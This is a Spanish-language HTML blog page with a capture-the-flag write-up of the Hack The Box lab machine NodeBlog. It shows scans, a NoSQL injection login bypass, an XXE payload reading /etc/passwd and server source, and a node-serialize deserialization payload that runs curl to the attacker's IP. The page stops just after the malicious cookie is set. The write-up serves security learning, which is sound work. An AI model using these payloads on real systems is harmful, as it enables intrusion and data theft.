@@ -1,0 +1,1069 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>NodeBlog HTB Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina NodeBlog de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="NodeBlog HTB Write-up">
+<meta property="og:url" content="http://localhost:4000/NodeBlog/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina NodeBlog de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/NodeBlog/node_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-11T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/NodeBlog/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">NodeBlog HTB Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-vel%C3%A1squez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="NodeBlog HTB Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina NodeBlog de Hack The Box">
+    <meta itemprop="datePublished" content="February 11, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">NodeBlog HTB Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-11T00:00:00-05:00">February 11, 2023 </time> 
+          
+          
+        </p>
+        <p align="center">
+<img src="/imagenes/NodeBlog/NodeBlog_banner.png" width="550" height="250">
+</p>
+
+<h1 id="resumen">
+<a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>Hack The Box</strong> llamada <strong>NodeBlog</strong>, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Injección noSQL.</li>
+  <li>XXE para leer archivos internos de la máquina.</li>
+  <li>Ataque de desserialización en Node.js.</li>
+  <li>Enumeración en MongoDB.</li>
+  <li>Automatización de la intrusión en Python.</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración">
+<a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.11.139
+
+PING 10.10.11.139 (10.10.11.139) 56(84) bytes of data.
+64 bytes from 10.10.11.139: icmp_seq=1 ttl=63 time=141 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap --open -sS -p- -min-rate 5000 -n -Pn 10.10.11.139 -oG ports
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
+22/tcp   open  ssh
+5000/tcp open  upnp
+</code></pre></div></div>
+<p>Realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p22,5000 10.10.11.139 -oN ServiceScan
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
+|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
+|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
+5000/tcp open  http    Node.js (Express middleware)
+|_http-title: Blog
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Observamos que se tiene el puerto 5000 con un servicio <strong>http</strong>, por lo tanto, utilizamos whatweb para enumerar información:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.11.139:5000
+http://10.10.11.139:5000 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.139], Script[JavaScript], Title[Blog], X-Powered-By[Express], X-UA-Compatible[IE=edge]
+</code></pre></div></div>
+
+<p>Entramos a la web para ver que tenemos:</p>
+
+<p><img src="/imagenes/NodeBlog/node1.png" alt=""></p>
+
+<p>Observamos una especie de blog que tiene solo una entrada, si la vemos:</p>
+
+<p><img src="/imagenes/NodeBlog/node2.png" alt=""></p>
+
+<p>Pero no tenemos nada interesante.</p>
+
+<p>Si volvemos tenemos un panel de login, asiq ue vamos a ingresar:</p>
+
+<p><img src="/imagenes/NodeBlog/node3.png" alt=""></p>
+
+<p>Vamos a dar credenciales en forma de prueba:</p>
+
+<p><img src="/imagenes/NodeBlog/node4.png" alt=""></p>
+
+<p>Como resultado tenemos:</p>
+
+<p><img src="/imagenes/NodeBlog/node5.png" alt=""></p>
+
+<p>Contraseña equivocada, esto quiere decir que tal vez podamos enumerar usuarios del sistema, si ingresamos otro nombre:</p>
+
+<p><img src="/imagenes/NodeBlog/node6.png" alt=""></p>
+
+<p>Tenemos como resultado:</p>
+
+<p><img src="/imagenes/NodeBlog/node7.png" alt=""></p>
+
+<p>Usuario no válido. Por lo tanto, el usuario admin si existe.</p>
+
+<p>Vamos a utilizar brupsuite para analizar la petición:</p>
+
+<p><img src="/imagenes/NodeBlog/node8.png" alt=""></p>
+
+<p>Obsevamos que se tramita por post el usuario y contraseña como esperaríamos.</p>
+
+<p>Vamos a intentar una injección básica de sql, pero en este caso está en url encode:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=admin'+or+'1'%3d'1--+-&amp;password=password
+</code></pre></div></div>
+<p>Pero nos dice usuario no válido.</p>
+
+<p>Podemos probar si el sistema se demora en responder 5 segundos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user=admin&amp;password=password'+or+sleep(5)
+</code></pre></div></div>
+<p>Pero no pasa nada.</p>
+
+<p>Cambiamos el método a aplication/json e intentamos de nuevo:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"admin' or 1=1-- -"</span><span class="p">,</span><span class="w">
+</span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"password"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Pero tampoco pasa nada.</p>
+
+<p>Quiźas no es vulnerable a SQLi, sin embargo, podríamos probar si es vulnerable a noSQLi. Podría ser que se esté aplicando un mongo, cassandra o alguna base de datos no relacional.</p>
+
+<p>Si buscamos por la web encontramos en <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">github</a> varios playloads para probar. Debemos probar varias, en este caso estamos utilizando json así que utilizaremos este:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"$ne"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">},</span><span class="w"> </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"$ne"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">}}</span><span class="w">
+</span></code></pre></div></div>
+<p>Como sabemos que el nombre de usuario válido es admin lo cambiaremos:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w"> </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nl">"$ne"</span><span class="p">:</span><span class="w"> </span><span class="s2">"zapato"</span><span class="p">}}</span><span class="w">
+</span></code></pre></div></div>
+<p>el <strong>“$ne”</strong> corresponde al not equal, por lo tanto, le estamos diciendo soy el usuario admin y mi contraseña no es zapato. Veamos que sucede:</p>
+
+<p><img src="/imagenes/NodeBlog/node9.png" alt=""></p>
+
+<p>Ha funcionado, estamos logeados dentro de la página. Por lo tanto, si era vulnerable a noSQLi.</p>
+
+<p>Observamos que tenemos una nueva área para subir cosas, si le hacemos click nos pedirá subir un archivo, vamos a subir un archivo de prueba para ver qué ocurre:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invalid XML Example: Example DescriptionExample Markdown
+</code></pre></div></div>
+
+<p>Tal parece que es necesario subir un archivo XML. Vamos a crear un archivo XML normal para ver que hace la página:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invalid XML Example: <span class="nt">&lt;post&gt;&lt;title&gt;</span>Example Post<span class="nt">&lt;/title&gt;&lt;description&gt;</span>Example Description<span class="nt">&lt;/description&gt;&lt;markdown&gt;</span>Example Markdown<span class="nt">&lt;/markdown&gt;&lt;/post&gt;</span>
+</code></pre></div></div>
+
+<p>Vamos a recrearlo:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;post&gt;</span>
+<span class="nt">&lt;title&gt;</span>archivo xml<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;description&gt;</span>Description<span class="nt">&lt;/description&gt;</span>
+<span class="nt">&lt;markdown&gt;</span> Markdown<span class="nt">&lt;/markdown&gt;</span>
+<span class="nt">&lt;/post&gt;</span>
+</code></pre></div></div>
+
+<p>Lo subimos a la web para ver que ocurre:</p>
+
+<p><img src="/imagenes/NodeBlog/node10.png" alt=""></p>
+
+<h2 id="explotación">
+<a href="#header-2"></a>Explotación</h2>
+
+<p>Vemos que ha parseado la información que hemos puesto en el archivo XML. Esto es peligroso porque puede acontecer un XXE que es una inyección de entidad externa XML. Buscamos en la web como explotar dicha vulnerabilidad, en la página de github de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Payloads all the things</a> tenemos bastantes para jugar.</p>
+
+<p>Si encontramos a la sección de XXE, encontramos lo siguiente:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+  <span class="cp">&lt;!DOCTYPE foo [  
+  &lt;!ELEMENT foo ANY &gt;</span>
+  <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span>]&gt;
+</code></pre></div></div>
+
+<p>Vamos a agregarlo a nuestro xml:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span>
+  <span class="cp">&lt;!DOCTYPE foo [  
+  &lt;!ELEMENT foo ANY &gt;</span>
+  <span class="cp">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span>]&gt;
+<span class="nt">&lt;post&gt;</span>
+<span class="nt">&lt;title&gt;</span>archivo xml<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;description&gt;</span>Description<span class="nt">&lt;/description&gt;</span>
+<span class="nt">&lt;markdown&gt;</span> <span class="ni">&amp;xxe;</span><span class="nt">&lt;/markdown&gt;</span>
+<span class="nt">&lt;/post&gt;</span>
+</code></pre></div></div>
+
+<p>En la sección de markdown agregamos <strong>&amp;xxe;</strong> para llamar la entidad y hacer que se acontezca el XXE, si subimos el archivo observamos:</p>
+
+<p><img src="/imagenes/NodeBlog/node11.png" alt=""></p>
+
+<p>Observamos que se ha ejecutado correctamente el comando, por lo tanto, explotamos el XXE, ahora lo utilizaremos para revisar diversas rutas e información del sistema, en la captura de nmap observamos que está el servidor de node.js normalmente en este tipo de proyectos hay diferentes archivos, uno en especial podríamos ver el llamado server.js, que quiźas podría contener información que nos ayude, sin embargo, no conocemos las rutas del sistema, pero como tenemos una injección noSQL podemos provocar un error y así ver si nos ofrece información de los directorios:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"user": "admin", "password": {^^^"asdasd$ne": "zapato"}}a
+</code></pre></div></div>
+<p>Al ingresar este <strong>json</strong> con error podemos observar lo siguiente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SyntaxError: Unexpected token ^ in JSON at position 31&lt;br&gt; &amp;nbsp; &amp;nbsp;at JSON.parse (&amp;lt;anonymous&amp;gt;)&lt;br&gt; &amp;nbsp; &amp;nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:89:19)&lt;
+</code></pre></div></div>
+
+<p>Observamos una dirección <strong>/opt/blog</strong> en donde se encuentra el <strong>node_modules</strong>, por lo tanto, ahi debe estar el servidor web js. En el <strong>XXE</strong> vamos a introducir la dirección <strong>/opt/blog/server.js</strong>, como resultado tenemos:</p>
+
+<p><img src="/imagenes/NodeBlog/node12.png" alt=""></p>
+
+<p>Tenemos el siguiente código en js:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongoose</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">Article</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./models/article</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">articleRouter</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/articles</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">loginRouter</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./routes/login</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">methodOverride</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">method-override</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">fileUpload</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express-fileupload</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">cookieParser</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">cookie-parser</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">)</span>
+<span class="kd">const</span> <span class="nx">cookie_secret</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">UHC-SecretCookie</span><span class="dl">"</span>
+<span class="c1">//var session = require('express-session');</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
+
+<span class="nx">mongoose</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongodb://localhost/blog</span><span class="dl">'</span><span class="p">)</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="kd">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ejs</span><span class="dl">'</span><span class="p">)</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="na">extended</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}))</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">methodOverride</span><span class="p">(</span><span class="dl">'</span><span class="s1">_method</span><span class="dl">'</span><span class="p">))</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">fileUpload</span><span class="p">())</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>
+<span class="c1">//app.use(session({secret: "UHC-SecretKey-123"}));</span>
+
+<span class="kd">function</span> <span class="nx">authenticated</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">c</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">false</span>
+
+    <span class="nx">c</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">sign</span> <span class="o">==</span> <span class="p">(</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">cookie_secret</span> <span class="o">+</span> <span class="nx">c</span><span class="p">.</span><span class="nx">user</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">))</span> <span class="p">){</span>
+        <span class="k">return</span> <span class="kc">true</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">articles</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">Article</span><span class="p">.</span><span class="nx">find</span><span class="p">().</span><span class="nx">sort</span><span class="p">({</span>
+        <span class="na">createdAt</span><span class="p">:</span> <span class="dl">'</span><span class="s1">desc</span><span class="dl">'</span>
+    <span class="p">})</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">articles/index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">articles</span><span class="p">:</span> <span class="nx">articles</span><span class="p">,</span> <span class="na">ip</span><span class="p">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">remoteAddress</span><span class="p">,</span> <span class="na">authenticated</span><span class="p">:</span> <span class="nx">authenticated</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">auth</span><span class="p">)</span> <span class="p">})</span>
+<span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/articles</span><span class="dl">'</span><span class="p">,</span> <span class="nx">articleRouter</span><span class="p">)</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="nx">loginRouter</span><span class="p">)</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">5000</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Si analizamos un poco el codigo, observamos que utiliza esta librería:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">serialize</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">node-serialize</span><span class="dl">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Y está esta función:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">authenticated</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">c</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">false</span>
+
+    <span class="nx">c</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">.</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">sign</span> <span class="o">==</span> <span class="p">(</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">cookie_secret</span> <span class="o">+</span> <span class="nx">c</span><span class="p">.</span><span class="nx">user</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">))</span> <span class="p">){</span>
+        <span class="k">return</span> <span class="kc">true</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Que recibe un parámetro c del usuario, la cual después compara con el resultado de la función hash para autenticar el usuario. Por lo tanto, está comparando las cookies para iniciar la sesión desserializando la data que le llega desde el usuario. Esto abre la posibilidad del ataque de desserialización, pues lo que podemos hacer es mandarle una data maliciosa que se va a serializar y mandar al servidor web, cuando este llegue va a ser desserializado, sin embargo, antes de que lo haga haremos que ejecute la acción que les estamos diciendo o el comando que mandamos de manera maliciosa a través de un bug en <strong>nodejs</strong> (IIFE).</p>
+
+<p>Si buscamos en la web tenemos esta <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">web</a> que nos dice la forma de enviar data serializada para injectar comandos, especificamente es esta:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
+</code></pre></div></div>
+<p>Sin embargo el que enviaremos será este:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('curl 10.10.14.17', function(error, stdout, stderr) { console.log(stdout) });}()"}
+</code></pre></div></div>
+<p>Enviando una petición http hacia nuestro equipo, vamos a tener abierto un servidor http con python para aquello. Hay que tener encuenta que la data viaja en url enconde, por lo tanto, vamos a aplicarselo a nuestra data:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%7b%22%72%63%65%22%3a%22%5f%24%24%4e%44%5f%46%55%4e%43%24%24%5f%66%75%6e%63%74%69%6f%6e%20%28%29%7b%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%63%75%72%6c%20%31%30%2e%31%30%2e%31%34%2e%31%37%27%2c%20%66%75%6e%63%74%69%6f%6e%28%65%72%72%6f%72%2c%20%73%74%64%6f%75%74%2c%20%73%74%64%65%72%72%29%20%7b%20%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%73%74%64%6f%75%74%29%20%7d%29%3b%7d%28%29%22%7d
+</code></pre></div></div>
+
+<p>Dentro del navegador web ponemos nuestra cookie y recargamos:</p>
+
+<p><img src="/imagenes/NodeBlog/node13.png" alt=""></p>
+
+<p>Luego de recargar la página, observamos el servidor http:</p>
+
